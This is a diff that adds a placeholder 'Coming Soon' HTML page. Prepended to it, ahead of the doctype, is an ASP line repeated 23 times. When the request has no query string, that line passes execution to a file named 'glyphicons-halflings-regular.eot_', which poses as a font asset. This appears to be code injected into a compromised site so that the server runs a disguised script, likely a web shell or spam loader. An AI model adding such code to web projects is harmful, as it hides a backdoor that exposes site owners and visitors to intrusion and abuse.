@@ -1,0 +1,13 @@
+<%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><%if request.querystring="" then    server.transfer("glyphicons-halflings-regular.eot_") %><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Coming Soon - Flatfull</title>
+</head>
+
+<body>
+
+  Coming Soon
+
+</body>
+</html>
